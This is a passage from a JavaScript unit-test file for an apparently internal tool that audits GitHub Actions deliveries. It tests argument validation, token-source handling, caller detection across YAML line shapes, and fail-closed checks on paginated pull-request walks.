          return true;
        },
      ),
  );
});

test('parseArgs: --repos naming one repository twice is refused, in either casing', () => {
  // Measured before the fix: parseArgs(['--repos=guard,guard']) yielded
  // ['guard','guard'] and nothing downstream noticed — the repo is audited twice,
  // every count doubles, and the replay list repeats every gap PR, i.e. two
  // writes to the prod queue for one missing score.
  for (const v of ['guard,guard', 'guard,Guard', 'a,guard,b,GUARD']) {
    assert.throws(
      () => parseArgs([`--repos=${v}`, '--since=2026-01-01'], NOW),
      /names the same repository more than once \(guard\)/,
      `--repos=${v} must be refused`,
    );
  }
  // Control on the CASE half: GitHub resolves repo names case-insensitively, so
  // `guard,Guard` is two spellings of one repo. A case-SENSITIVE check passes
  // that cell, which is why it is in the loop above rather than assumed.
  //
  // Control in the other direction: distinct names still pass, and pass
  // UNCHANGED — the check must not quietly rewrite the caller's list (lowercase
  // it, sort it, dedupe it) on the way through.
  const ok = parseArgs(['--repos=guard,Palatine,caeruleus', '--since=2026-01-01'], NOW);
  assert.deepEqual(ok.repos, ['guard', 'Palatine', 'caeruleus']);
});

test('pickToken: an EMPTY GITHUB_TOKEN is refused, not silently swapped for GH_TOKEN', () => {
  // '' is falsy, so `a || b` reads a set-but-empty variable as unset and reaches
  // for the next source. `env: GITHUB_TOKEN: ${{ secrets.X }}` with X absent or
  // empty produces exactly that, and the audit then runs under whatever GH_TOKEN
  // is ambient on the runner — a different grant than the caller declared, and
  // usually a broader one. Measured before the fix: empty GITHUB_TOKEN with
  // GH_TOKEN set completed normally, api_calls=8, exit 0.
  assert.throws(
    () => pickToken({ GITHUB_TOKEN: '', GH_TOKEN: 'ambient' }),
    /GITHUB_TOKEN is set but EMPTY — refusing to fall through to GH_TOKEN/,
  );

  // The refusal is conditioned on a swap being AVAILABLE, so that the message is
  // true whenever it is emitted. Empty with nothing usable behind it swaps
  // nothing; it routes to main()'s unset-or-empty refusal, same exit code, honest
  // message.
  assert.equal(pickToken({ GITHUB_TOKEN: '', GH_TOKEN: '' }), null);
  assert.equal(pickToken({ GITHUB_TOKEN: '' }), null);
  assert.equal(pickToken({}), null);

  // Precedence itself, which the check must not have disturbed: GITHUB_TOKEN wins
  // when set, GH_TOKEN is the fallback when GITHUB_TOKEN is ABSENT (as opposed to
  // present-and-empty — that distinction is the whole point).
  assert.equal(pickToken({ GITHUB_TOKEN: 'a', GH_TOKEN: 'b' }), 'a');
  assert.equal(pickToken({ GH_TOKEN: 'b' }), 'b');
  assert.deepEqual(TOKEN_SOURCES, ['GITHUB_TOKEN', 'GH_TOKEN']);
});

test('renderMarkdown: the replay caveats admit a never_fired verdict cannot see a DELETED run', () => {
  // `never_fired` reads "no run row" as "no run ever existed", and a deleted run
  // falsifies that with no tombstone in the Actions API to read. The direction is
  // a replay of a delivery that may already have happened — a second write to the
  // prod queue, against consumer idempotency that is not established (ENG-5789).
  // No probe available to this token separates the two, so what is fixable here
  // is the CLAIM: the paragraph a human reads immediately before pasting the
  // dispatch command has to say so, since the operator is the only party who can
  // check the run history.
  const md = renderMarkdown(gapReport({ replay: [9, 10] }), CFG);
  assert.match(md, /deleted run leaves no trace in the Actions API/);
  assert.match(md, /indistinguishable here from one that never fired/);
  // In the blockquote with the other pre-dispatch caveats, not stranded in prose
  // somewhere above the command.
  assert.match(md, /^> A `never_fired` verdict means/m);

  // And it is tied to the replay block rather than printed unconditionally: a
  // repo whose only defect is unfixable-by-replay gets no dispatch command, so a
  // caveat about replaying would be advice about a command that is not there.
  const noReplay = renderMarkdown(gapReport({ replay: [] }), CFG);
  assert.doesNotMatch(noReplay, /deleted run leaves no trace/);
});

test('REPLAY_CAVEATS: EVERY caveat reaches BOTH channels, not just the prose one', () => {
  // The residual the round-16 fix left. Those caveats were written into
  // renderMarkdown, which is the channel a HUMAN reads before pasting a command;
  // buildReport's `replay:` stayed a bare array of PR numbers with nothing
  // qualifying it anywhere in the document — and the JSON is precisely what the
  // planned auto-dispatch (ENG-5789) consumes. So the warning reached the reader
  // who was already being warned and missed the consumer that writes to prod
  // unattended.
  //
  // Iterated rather than spot-checked: a test naming three caveats by hand passes
  // unchanged when a FOURTH is added to one channel only, which is the exact
  // drift being fixed.
  assert.ok(REPLAY_CAVEATS.length >= 3, 'fixture guard: the caveat list must be non-trivial');

  const md = renderMarkdown(gapReport({ replay: [9, 10] }), CFG);
  const json = buildReport([repoResult('guard', { merged: 2, never_fired: [rec(9), rec(10)] })], CFG, 1);

  assert.deepEqual(
    json.replay_caveats.map((c) => c.id),
    REPLAY_CAVEATS.map((c) => c.id),
    'the JSON must carry every caveat, in the same order, keyed by a stable id',
  );

  for (const c of REPLAY_CAVEATS) {
    // Machine channel: the `id` is what a consumer branches on, since wording
    // will be reworded.
    const inJson = json.replay_caveats.find((x) => x.id === c.id);
    assert.ok(inJson, `caveat "${c.id}" missing from the JSON report`);
    assert.equal(inJson.text, c.text);

    // Human channel: the same text, as a blockquote line.
    assert.ok(md.includes(`> ${c.text}`), `caveat "${c.id}" missing from the markdown`);

    // cfg-INDEPENDENT, which is what lets one source feed both. renderMarkdown and
    // buildReport are called with different cfg shapes by tests and consumers, so
    // an interpolated field absent from one of them renders the literal
    // "undefined" into an operator-facing warning about a prod write.
    assert.doesNotMatch(c.text, /undefined/, `caveat "${c.id}" interpolated a missing cfg field`);
  }

  // Tied to there being something to replay, in BOTH channels, so a clean report
  // carries no warning about a list it does not contain.
  const clean = buildReport([repoResult('guard', { merged: 1, delivered: [rec(1)] })], CFG, 1);
  assert.equal(clean.repos_with_gaps.length, 0);
  assert.equal('replay_caveats' in clean, false);
});

// ── Round 18 ─────────────────────────────────────────────────────────────────
//
// Seven tests for the seven fixes adjudicated in round 18. Each is written to
// fail against the round-17 code specifically, and the two one-sided checks
// (the closed-PR count bracket, the caveat gate) carry their opposite-direction
// control in the same block, because a one-sided check with only one test
// pinned is indistinguishable from a check that always fires.

test('hasCaller: `uses` must be a KEY at a node position AND the reusable its VALUE — a shape table, both directions', async () => {
  // Round 17 shipped `/(^|\s)uses:\s/` — any `uses:` at a word boundary anywhere
  // on the line. Wrong in BOTH directions, and the two call sites do opposite
  // harm: over-detect at auditRepo fabricates a PROD replay list (no caller ->
  // no runs -> every merged PR never_fired), under-detect at resolveFleet drops
  // the repo from an org-enumerated fleet, which is unaudited yet reports clean.
  //
  // Driven off a table rather than three hand-picked cases so the two rejected
  // candidate predicates can be scored against the SAME ground truth below.
  const cfg = callerCfg();
  const R = `${cfg.reusable}@abc123`;
  const SHAPES = [
    // Real fleet shapes. Every live caller in the org is the first one.
    { want: true, label: 'block mapping (every real fleet caller)', line: `    uses: ${R}` },
    { want: true, label: 'block, sequence dash on the same line', line: `  - uses: ${R}` },
    { want: true, label: 'block, single-quoted value', line: `    uses: '${R}'` },
    { want: true, label: 'block, double-quoted value', line: `    uses: "${R}"` },
    { want: true, label: 'block, extra space before the value', line: `    uses:   ${R}` },
    // FLOW shapes, and JSON shapes where the key is not at a node position. NOT
    // detected as of round 20, and these rows record that as a deliberate,
    // measured choice rather than an oversight.
    //
    // (Through round 21 this comment split the class: the flow ANCHOR came out
    // but a quoted KEY at a node position stayed detected, on the argument that
    // it "costs nothing" — the backreference could mistake no scalar-interior
    // text for structure ON ONE LINE. Round 21's review exhibited the cost one
    // layer up, across lines — see rows 25-27 — and round 22 removed quoted-key
    // support too, so the two JSON rows below are now unmatched for both
    // reasons: anchor AND quoting.)
    //
    // They read `want: true` through round 19 on the argument that they are valid
    // Actions YAML and dropping such a repo is the silent direction. The comment
    // conceded even then that there was "no live occurrence"; round 20 measured
    // that claim instead of asserting it, via GitHub code search over the org with
    // control queries to prove the search answers at all:
    //
    //   path:.github/workflows "uses:"            596   <- control
    //   path:.github/workflows "actions/checkout" 446   <- control
    //   path:.github/workflows "{uses:"             0
    //   path:.github/workflows "\"uses\":"          0
    //
    // Zero, in 596 workflow files that DO write `uses:`. Supporting these shapes
    // required anchoring the key matcher after `{` and `,`, and a `{` or `,` inside
    // an ordinary scalar is not distinguishable line-locally from one that opens a
    // flow mapping — which is where every residual false positive of rounds 18, 19
    // and 20 came from. So the support buys detection of nothing measurable and
    // pays for it in the direction that fabricates a PROD replay list.
    { want: false, label: 'flow mapping in a sequence', line: `    - {uses: ${R}}` },
    { want: false, label: 'flow mapping, uses as the SECOND key', line: `    - {name: x, uses: ${R}}` },
    { want: false, label: 'JSON-formatted workflow', line: `        {"uses": "${R}"}` },
    { want: false, label: 'JSON, quoted key mid-object', line: `        "name": "x", "uses": "${R}"` },
    // Not callers. Matching any of these fabricates a prod replay list.
    { want: false, label: 'one-line run: echoing a caller template', line: `        run: echo uses: ${R}` },
    { want: false, label: 'one-line run: grepping for it', line: `        run: grep uses: ${R} x.yml` },
    { want: false, label: 'prose value naming the reusable', line: `        description: calls uses: ${R}` },
    { want: false, label: 'a one-line QUOTED scalar', line: `        name: "uses: ${R}"` },
    { want: false, label: 'a DIFFERENT key ending in uses', line: `    reuses: ${R}` },
    { want: false, label: 'a key whose name CONTAINS uses', line: `    always-uses: ${R}` },
    // A 16th shape, added because the mutation run showed the comment strip had
    // become unpinned. The node-position anchor rejects a fully COMMENTED
    // `uses:` line on its own, so the round-12 commented-template test survived
    // a mutant that disabled stripComment entirely — the test passed for the new
    // reason instead of the one it was written for. This is the shape where the
    // strip is still the ONLY thing standing: a real `uses:` key calling
    // something else, with the reusable named in a TRAILING comment. Unstripped,
    // `code.includes(cfg.reusable)` is true and the repo joins the fleet with a
    // caller it does not have.
    {
      want: false,
      label: 'a uses: key calling something ELSE, reusable only in a trailing comment',
      line: `    uses: actions/checkout@v4  # replaces ${R}`,
    },
    // Rows 17-20, added in round 19. Every row above holds the reusable in the
    // `uses` value or in no value at all, so the round-18 predicate — a
    // key-position test AND a WHOLE-LINE substring test, two independent
    // questions ANDed — scores 16/16 on them by luck: wherever a `uses` key
    // exists, the only thing the reusable could be is its value. These rows
    // separate the two questions, which flow style makes reachable in one line.
    {
      want: false,
      label: 'a uses: key calling something ELSE, reusable in a SIBLING key value',
      line: `    - {uses: actions/checkout@v4, name: "${R}"}`,
    },
    {
      want: false,
      label: 'reusable nested in a with: value, uses: calls something else',
      line: `    - {uses: actions/checkout@v4, with: {ref: "${R}"}}`,
    },
    // The mirror of the row above it, and the reason the fix reads VALUES rather
    // than deleting the substring test: swapping which key holds which value must
    // flip the answer. A matcher that returned false for both would score the
    // over-detection row correctly while being useless.
    // Was want:true through round 19, as the control proving the value-reading fix
    // could still say YES. It is a flow mapping, so round 20's removal of flow
    // support makes it false along with the rest of its class. The control job it
    // did — "a matcher that answers false to everything would score the
    // over-detection rows correctly while being useless" — has not disappeared; it
    // is carried by the five block-style want:true rows at the top, which are the
    // shapes every live caller in the org actually writes.
    {
      want: false,
      label: 'CONTROL — the same two keys with the values swapped',
      line: `    - {uses: ${R}, name: "actions/checkout@v4"}`,
    },
    // Two `uses:` positions on one line, only the second a real key. Pins that
    // the scan collects EVERY match rather than deciding on the first: keyed on
    // the first alone this is a checkout call and the repo silently leaves the
    // fleet.
    {
      want: false,
      label: 'a decoy uses: inside a quoted sibling value, real uses: after it',
      line: `    - {name: "a, uses: actions/checkout@v4", uses: ${R}}`,
    },
    // ROUND 21's row: the shape the round-20 review reported, and the reason flow
    // support was removed rather than patched a fourth time. A perfectly ordinary
    // one-line `run:` whose SHELL TEXT contains a flow-mapping brace. Round 19
    // documented this as a knowingly accepted residual; it is closed now, and it is
    // closed for its whole class rather than for this instance — the two rows after
    // it are the same defect wearing `name:` and `if:`, which a `run:`-only rule
    // would have left standing.
    {
      want: false,
      label: 'a one-line run: whose shell text contains a flow mapping',
      line: `        run: echo '{uses: ${R}}'`,
    },
    {
      want: false,
      label: 'the same brace inside a quoted name: value',
      line: `        name: "see {uses: ${R}} below"`,
    },
    {
      want: false,
      label: 'the same brace inside an if: expression',
      line: `        if: contains(inputs.x, '{uses: ${R}}')`,
    },
    // The row that JUSTIFIES reading the value at all. Once round 20 dropped flow
    // support, a block `uses:` value runs to end of line, so "the value contains
    // the reusable" and "the line contains the reusable" agree on every well-formed
    // shape above — a mutation run restoring the round-18 whole-line predicate
    // survived the other 23. They part on exactly this: a QUOTED value with the
    // reusable as trailing junk after the closing quote. The line is malformed YAML,
    // which is the point — a broken workflow file must not be able to fabricate a
    // fleet member, because over-detection is the direction that ends in a
    // production replay list for deliveries that already succeeded.
    {
      want: false,
      label: 'a quoted uses: value with the reusable as trailing junk (malformed)',
      line: `        uses: 'actions/checkout@v4' ${R}`,
    },
    // Rows 25-27, added in round 21 as want:true, FLIPPED to want:false in
    // round 22. Round 21 pinned the QUOTED KEY at a node position and kept the
    // support on the argument that "dropping it would only lose detection, and
    // a missed caller is the SILENT-CLEAN direction". The round-21 review
    // refuted that argument by exhibiting the support's over-detect arm:
    // yamlStructureLines tracks no quote state, so a continuation line of an
    // OPPOSITE-quoted multiline scalar carrying `"uses": "<ref>"` was read as
    // structure and fabricated a fleet member — a PROD replay list for
    // deliveries that succeeded (asserted below this table, alongside the
    // documented unquoted residual). Detection value measured at zero
    // (`"uses":` in 0 of 596 org workflow files — see USES_KEY), so round 22
    // removed the quoting group and the tail-requote branch the same way round
    // 20 removed the flow arm. The rows stay in the table with the sign
    // flipped, so restoring quoted-key support has to come here and flip three
    // expectations rather than silently widen the matcher.
    {
      want: false,
      label: 'double-quoted KEY at a node position (support removed, round 22)',
      line: `    "uses": "${R}"`,
    },
    {
      want: false,
      label: 'single-quoted KEY at a node position (support removed, round 22)',
      line: `    'uses': '${R}'`,
    },
    // The strict-JSON spelling the tail-requote branch existed to serve. Not
    // even a lost detection: with no space after the colon this is not a
    // block-mapping entry at all — YAML reads the whole line as ONE plain
    // scalar — so a workflow written this way never called anything.
    {
      want: false,
      label: 'quoted key AND no space before the quoted value (strict JSON spelling)',
      line: `    "uses":"${R}"`,
    },
  ];
  assert.equal(SHAPES.length, 27, 'the shape table is the measurement this fix was chosen on');

  for (const s of SHAPES) {
    const text = ['name: x', 'jobs:', '  call:', s.line, ''].join('\n');
    assert.equal(
      await hasCaller(contentClient(text), cfg, 'guard'),
      s.want,
      `${s.label}: expected has_caller=${s.want} for\n  ${s.line}`,
    );
  }

  // ANTI-VACUOUS, and the reason the table is here at all: a table that every
  // plausible predicate satisfies proves nothing about the one that shipped.
  // The REJECTED candidates are restated (not the shipped one — that would
  // assert X === X) and each must get at least one row wrong.
  const r17 = (l) => /(^|\s)uses:\s/.test(l);
  const blockOnly = (l) => /^\s*(?:-\s+)?uses:\s/.test(l);
  const score = (p) => SHAPES.filter((s) => (p(s.line) && s.line.includes(R)) !== s.want);

  assert.ok(
    score(r17).length > 0,
    'the round-17 predicate must FAIL this table, or these rows do not describe the defect',
  );
  // Round 18 rejected a line-start-only anchor because it LOSES
  // `- {name: x, uses: <ref>}`, and that regression is why the shipped matcher
  // anchored after `{` and `,` for two rounds. Round 20 reverses the trade on
  // measurement — zero flow-style or JSON-style `uses` in 596 org workflow files —
  // so the loss is real but costs nothing observable, while the anchor it bought
  // cost a false-caller class that ends in a prod replay list.
  //
  // The row is still here and still asserted, as the price being paid rather than
  // a regression nobody noticed: block-only genuinely does not see it. (As of
  // round 22 the shipped anchor IS block-only — quoting removed too, and the only
  // difference left is tolerated space before the colon — so this line stopped
  // being a rejected candidate and became the record of what the shipped shape
  // pays on this row.)
  const flowSecondKey = SHAPES.find((s) => s.label.includes('SECOND key'));
  assert.equal(
    blockOnly(flowSecondKey.line),
    false,
    'the block-only anchor must be shown to LOSE `- {name: x, uses: <ref>}` — that is ' +
      'the measured cost of removing flow support, and this row is what pays it',
  );

  // ROUND 19. `score` is not an arbitrary scoring rule — its `p(line) && includes(R)`
  // shape IS the round-18 predicate, with `p` standing in for the key matcher. So
  // scoring the SHIPPED key matcher through it measures round-18 exactly, and the
  // rows it gets wrong are the ones the value-reading fix was written for. Stated
  // as a floor rather than an exact count so a future row cannot silently make
  // this vacuous, and separately as a want:false floor because the over-detection
  // is the arm that fabricates a prod replay list.
  const usesKeyAt = (l) => /(?:^\s*(?:-\s+)?|[{,]\s*)(["']?)uses\1\s*:(?:\s|["'])/.test(l);
  const r18Wrong = score(usesKeyAt);
  assert.ok(
    r18Wrong.length >= 2,
    `the round-18 predicate must FAIL at least two rows, or these rows do not describe ` +
      `the defect (it missed ${r18Wrong.length}: ${r18Wrong.map((s) => s.label).join('; ')})`,
  );
  assert.ok(
    r18Wrong.some((s) => s.want === false),
    'the round-18 predicate must be shown to OVER-detect — that is the arm that joins a ' +
      'repo to the fleet with a caller it does not have, and every merged PR then ' +
      'classifies never_fired against a reusable that never ran for it',
  );
  // And the shipped code must get every row, which `score` cannot assert (feeding
  // it the shipped matcher is the X === X the block above avoids). Asserted
  // through the exported unit instead, at the value layer the fix operates on.
  for (const s of SHAPES) {
    assert.equal(
      usesValues(stripComment(s.line)).some((v) => v.includes(cfg.reusable)),
      s.want,
      `usesValues disagrees with hasCaller on: ${s.label}`,
    );
  }

  // The two properties the round-20 simplification rests on. Both were flow-mapping
  // machinery whose only consumer was the flow arm removed from USES_KEY, and a
  // mutation run found each one unkillable once that arm was gone — a survivor is
  // the harness reporting dead code, so the code came out and the properties are
  // asserted here instead.
  //
  // (1) At most ONE value, and a later `uses:` is part of the FIRST value. Stated
  // honestly: this assertion CANNOT be killed by swapping the single `exec` back
  // to a scan, and a run confirmed that mutant survives. That is not a weak test,
  // it is the proof the loop was dead — `^` with no `m` flag matches only at index
  // 0, so scan and exec return the same thing on every input (probed:
  // `"uses: a  uses: b"`, `"  - uses: a, uses: b"`, `"uses: a\nuses: b"` → 1 match
  // each). The line below therefore pins the OBSERVABLE contract, so that
  // un-anchoring the matcher later has to come here and change an expectation
  // rather than silently reintroducing a second value.
  assert.deepEqual(usesValues('uses: a  uses: b'), ['a  uses: b']);

  // (2) An unquoted BLOCK value runs to end of line. The old rule cut it at `,`
  // or `}` — the flow terminators — which for a ref containing a legal comma
  // silently truncated the value, un-matched the reusable, dropped the repo out of
  // the fleet, and left the fleet reporting clean. This is the under-detect
  // direction, so it gets an explicit row rather than only the over-detect ones.
  const comma = `${cfg.reusable.split('@')[0]}@rel,v2`;
  assert.deepEqual(usesValues(`uses: ${comma}`), [comma]);
  assert.equal(usesValues(`uses: ${comma}`)[0].includes(cfg.reusable.split('@')[0]), true);
  // The quoted spelling of the same value was already correct — it is the control
  // proving the fix changed the unquoted path only.
  assert.deepEqual(usesValues(`uses: '${comma}'`), [comma]);

  // Round 19 left a residual here and said so: no line-oriented rule can tell
  // `{uses: x}` as YAML from the same text inside a one-line shell string, so the
  // shape was documented and deliberately left unasserted. Round 20's review
  // reported exactly that shape.
  //
  // It is closed now, and closed by DELETING the flow-mapping anchor rather than by
  // adding a fourth special case on top of three rounds of them. That is why the
  // three rows above are asserted rather than described: with no `{`/`,` anchor
  // there is no line on which a brace inside a scalar can be mistaken for
  // structure, so the answer is stable for the whole class and not just for the
  // instance that was reported.
  //
  // What remains genuinely open is the mirror: a real flow-style caller would now
  // be missed. That is measured at zero org-wide (see the table's flow rows) and
  // the fix for it, if it ever stops being zero, is `referenced_workflows` from the
  // runs API — GitHub's own parse of the reference — not a hand-rolled parser this
  // zero-dependency action would have to grow. Filed as ENG-5922.

  // ROUND 22: the multiline-scalar shape, both spellings, driven through the
  // FULL hasCaller pipeline rather than usesValues alone because the defect
  // lives in the seam between its two halves — yamlStructureLines tracks no
  // quote state, so a scalar's continuation line reaches the key matcher as if
  // it were structure. The table above cannot carry these: its rows are single
  // lines wrapped in a fixed well-formed document.
  //
  // The QUOTED spelling is the round-21 review's finding: a continuation line
  // of an OPPOSITE-quoted scalar carrying `"uses": "<ref>"` fired hasCaller and
  // fabricated a fleet member — no caller, no runs, every merged PR
  // never_fired, a PROD replay list for deliveries that succeeded. CLOSED by
  // removing quoted-key support from USES_KEY; this assertion keeps it closed.
  const quotedKeyInScalar = [
    'jobs:',
    '  docs:',
    '    steps:',
    "      - name: 'documentation",
    `          "uses": "${R}"'`,
    '      - uses: actions/checkout@v4',
    '',
  ].join('\n');
  assert.equal(
    await hasCaller(contentClient(quotedKeyInScalar), cfg, 'guard'),
    false,
    'a quoted uses key on a scalar CONTINUATION line must not fabricate a caller',
  );
  // The UNQUOTED spelling is the residual DOCUMENTED at yamlStructureLines:
  // still read as structure, still over-detects. Asserted true not because true
  // is the desired answer but so the documentation cannot drift — a change that
  // closes the residual must flip this expectation and move the comment at
  // yamlStructureLines in the same diff.
  const unquotedKeyInScalar = [
    'jobs:',
    '  docs:',
    '    steps:',
    "      - name: 'documentation",
    `          uses: ${R}'`,
    '      - uses: actions/checkout@v4',
    '',
  ].join('\n');
  assert.equal(
    await hasCaller(contentClient(unquotedKeyInScalar), cfg, 'guard'),
    true,
    'the documented unquoted residual: if this returns false the residual is closed — ' +
      'flip this expectation and update the yamlStructureLines comment together',
  );
});

test('ghCount: reads the row count from rel="last" at per_page=1, and fails closed', async () => {
  // The probe that makes auditRepo's removal residual OBSERVABLE. Round 17 argued
  // in prose that a mid-walk reopen could drop a row, and shipped nothing that
  // could see it happen.
  //
  // per_page=1 is load-bearing, not tidiness: rel="last" reports a PAGE number,
  // so the same header at per_page=100 means "somewhere in 9901..10000 rows" and
  // the bracket would compare two numbers that are not row counts at all.
  const seen = [];
  const n = await withFetch(
    async (url) => {
      seen.push(String(url));
      return paged([{ number: 1 }], {
        link: '<https://api.github.com/x?per_page=1&page=250>; rel="last"',
      });
    },
    () => makeClient('t').ghCount('/repos/o/r/pulls?state=closed'),
  );
  assert.equal(n, 250, 'the last PAGE number IS the row count when per_page=1');
  assert.equal(seen.length, 1, 'a count probe is one request, not a walk');
  assert.match(seen[0], /[?&]per_page=1(&|$)/, 'the probe must pin per_page=1');
  assert.match(seen[0], /state=closed/, 'and must not drop the query it was handed');
  assert.match(seen[0], /state=closed&per_page=1/, 'an existing query joins with &, not ?');

  // No rel="last" means a single page — which at per_page=1 is 0 or 1 rows —
  // and since round 24 the 1-row claim is VERIFIED with a per_page=2 re-probe
  // before it is believed, because an absent Link is also what a stripped
  // header looks like. The consistent case returns the count and costs one
  // extra request.
  const singleSeen = [];
  const single = await withFetch(
    async (url) => {
      singleSeen.push(String(url));
      return paged([{ number: 9 }]);
    },
    () => makeClient('t').ghCount('/repos/o/r/pulls'),
  );
  assert.equal(single, 1);
  assert.equal(singleSeen.length, 2, 'an absent Link is VERIFIED, never trusted bare');
  assert.match(singleSeen[1], /[?&]per_page=2(&|$)/, 'the verification probe must pin per_page=2');
  // A path with no query joins with `?`, and an EMPTY body needs no verification:
  // a stripped Link cannot fake emptiness — the body is the data channel, and a
  // 250-row list at per_page=1 returns a row even with every header removed.
  const noQuery = [];
  await withFetch(
    async (url) => {
      noQuery.push(String(url));
      return paged([]);
    },
    () => makeClient('t').ghCount('/repos/o/r/pulls'),
  );
  assert.match(noQuery[0], /\/pulls\?per_page=1$/);
  assert.equal(noQuery.length, 1, 'zero rows resolve on the first probe alone');

  // A caller that sets per_page itself gets a throw, BEFORE any request. The
  // alternative is the silent one: two `per_page=100` probes compare page counts,
  // agree, and the bracket reports "no removal" for a list that lost a row.
  const spent = [];
  await withFetch(
    async (url) => {
      spent.push(String(url));
      return paged([]);
    },
    () =>
      assert.rejects(
        () => makeClient('t').ghCount('/repos/o/r/pulls?per_page=100'),
        /must not set per_page/,
      ),
  );
  assert.equal(spent.length, 0, 'the refusal must precede the request, not follow it');

  // And a 404 is an UNREAD subject, never "0 rows" — the same false-clean
  // direction ghPaged's 404 fix closed. A 404 answered as 0 would make every
  // bracket trivially satisfied (0 -> 0) on a repo nobody can read.
  //
  // Matched on the phrase that only the EXPLICIT 404 arm emits, not on "404".
  // The mutation run caught this: disabling that arm falls through to the generic
  // `${res.status} on the count probe` throw, whose text ALSO starts "404 on the
  // count probe", so a looser regex was satisfied by the branch it was written to
  // prove was taken — a check that cannot fail for the reason it claims.
  await withFetch(
    async () => notFound(),
    () =>
      assert.rejects(
        () => makeClient('t').ghCount('/repos/o/r/pulls'),
        /404 on the count probe.*subject could not be read/,
      ),
  );
});

// A closed-PR page as the walk sees it. Unmerged on purpose: these tests are
// about the completeness of the WALK, and a merged row would drag every
// classification path in behind it.
const closedRows = (n) => Array.from({ length: n }, (_, k) => ({ number: k + 1, merged_at: null }));

test('auditRepo: a closed-PR walk that STOPPED EARLY is refused, not reported as clean', async () => {
  // The failure the before/after bracket cannot see, because the LIST never
  // changed: 250 rows before, 250 after, and a walk that returned 100. The
  // bracket compares the two counts, agrees, and 150 merged PRs go unaudited —
  // the same false clean the bracket exists to prevent, arriving through the
  // other door.
  //
  // Not hypothetical: ghPaged advances by parsing `rel="next"` out of the Link
  // header, so anything that makes ONE header unparseable (the comma trap
  // documented on ghPaged, a proxy rewriting or dropping it) ends the walk and
  // returns what it has, with no error. runsInRange has asserted this on the runs
  // endpoint since round 14; the closed-PR walk is the LARGER of the two — 65
  // pages on guard against a handful for a slice — and had no such assertion.
  const client = {
    ghPaged: async () => closedRows(100),
    gh: async () => ({ total_count: 0 }),
    ghCount: async () => 250,
  };
  await assert.rejects(
    () =>
      auditRepo(
        client,
        { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
        'guard',
      ),
    /returned 100 rows but the list held at least 250/,
  );
});

test('auditRepo: CONTROL — a walk that REACHED the mid-walk insertion is not refused', async () => {
  // The other half of the GREW control, and the one that pins the shortfall check
  // as ONE-SIDED. There are two ways a list can grow under a walk, and only this
  // one can reach an over-strict check: the row that closed mid-walk landed AHEAD
  // of the cursor, so the walk returned 251 rows for a list that held 250 when it
  // started. `fetched.length < closedBefore` tolerates that; the obvious-looking
  // `!==` refuses it, and would turn every busy repo's audit into exit-2 unknown.
  //
  // Added in round 19 because the mutation run said so: the mutant that makes the
  // check two-sided SURVIVED against the 250-row GREW control, since 250 !== 250
  // is false and the mutation changed nothing that test could see. A one-sided
  // check with only the under-detection direction pinned is indistinguishable
  // from a check with no upper bound at all.
  const counts = [250, 251];
  let i = 0;
  const client = {
    ghPaged: async () => closedRows(251),
    gh: async () => ({ total_count: 0 }),
    ghCount: async () => counts[i++],
  };
  const res = await auditRepo(
    client,
    { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
    'guard',
  );
  assert.equal(res.repo, 'guard');
  assert.equal(i, 2);
});

test('ghCount: a DEFLATED count channel is refused, not returned', async () => {
  // The codex round-23 finding. An absent Link header is GitHub's documented
  // single-page signal, but it is also exactly what a Link header STRIPPED by an
  // intermediary looks like — and if every response loses it, the per_page=1
  // probe reads a multi-page list as 1 row while the walk (which advances on
  // rel="next") ends after its first page. Both brackets around the closed-PR
  // walk then pass because both channels shrank together: 1 -> 1 is no shrink,
  // and 100 fetched >= 1 counted is no shortfall — a repo with hundreds of
  // closed PRs reports clean with all but 100 never audited.
  //
  // The claim is therefore verified where it is MADE. A walk-side cross-check
  // (fetched > closedAfter) was tried first and refused the union-recovery
  // fixture below: the union of two walks legitimately holds more rows than the
  // final count whenever a netted reopen races it — the exact churn the union
  // exists to survive — so any read-more-than-counted predicate over the walk
  // conflates corruption with tolerated churn. The per_page=2 re-probe does
  // not: a second row coming back contradicts "the collection ends at one row"
  // under ANY churn, because rows cannot be read out of a 1-row page.
  await withFetch(
    async (url) =>
      /[?&]per_page=2(&|$)/.test(String(url))
        ? paged([{ number: 1 }, { number: 2 }])
        : paged([{ number: 1 }]),
    () =>
      assert.rejects(
        () => makeClient('t').ghCount('/repos/o/r/pulls?state=closed'),
        /verification probe at per_page=2 returned 2 rows.*DEFLATED/s,
      ),
  );
  // The transient shape: the re-probe carries the Link header the first probe
  // lacked. The count COULD be recomputed from it, but a channel that drops
  // headers intermittently is a broken instrument, not a source of truth — the
  // walks depend on the same header arriving on every page.
  await withFetch(
    async (url) =>
      /[?&]per_page=2(&|$)/.test(String(url))
        ? paged([{ number: 1 }], {
            link: '<https://api.github.com/x?per_page=2&page=125>; rel="last"',
          })
        : paged([{ number: 1 }]),
    () =>
      assert.rejects(
        () => makeClient('t').ghCount('/repos/o/r/pulls?state=closed'),
        /returned 1 rows and a Link header/,
      ),
  );
});

test('auditRepo: CONTROL — a COMPLETE closed-PR walk passes both bracket arms', async () => {
  // The anti-tripwire for the two refusals above: a walk that read everything,
  // against a list that did not move, must audit normally. Without this a check
  // that threw unconditionally would satisfy both rejection tests.
  const client = {
    ghPaged: async () => closedRows(250),
    gh: async () => ({ total_count: 0 }),
    ghCount: async () => 250,
  };
  const res = await auditRepo(
    client,
    { owner: 'praetorian-inc', callerFile: 'c.yml', callerPath: '.github/workflows/c.yml', since: '2026-05-01', until: null },
    'guard',
  );
  assert.equal(res.repo, 'guard');
  assert.equal(res.merged_prs, 0);
});

test('auditRepo: a closed-PR list that SHRANK mid-walk is refused, not reported', async () => {
  // The worked example, which is also why comparing the walk's own length against
  // the FINAL count is vacuous:
  //
  //   250 rows, per_page=100. Page 1 reads positions 1..100. Row 50 is reopened.
  //   The list is now 249, so page 2 reads positions 101..200 of the NEW list =
  //   old rows 102..201. OLD ROW 101 IS NEVER RETURNED — and the walk returns 249
  //   rows while the collection now holds 249, so fetched-vs-final agrees
  //   perfectly. Only before-vs-after sees it.
  //
  // A merged PR that is never read cannot be classified, so it cannot be
  // reported as a gap: the loss direction is a FALSE CLEAN, and this refuses
  // rather than emit one.
  //
  // The walk is stubbed COMPLETE (250 rows for a 250-row list) so this test
  // isolates the shrink arm. An empty stub — which is what this was — would also
  // trip the shortfall check added below, and the test would keep passing on
  // whichever arm happened to run first rather than on the one it names.
  const counts = [250, 249];
  let i = 0;
  const client = {
    ghPaged: async () => closedRows(250),
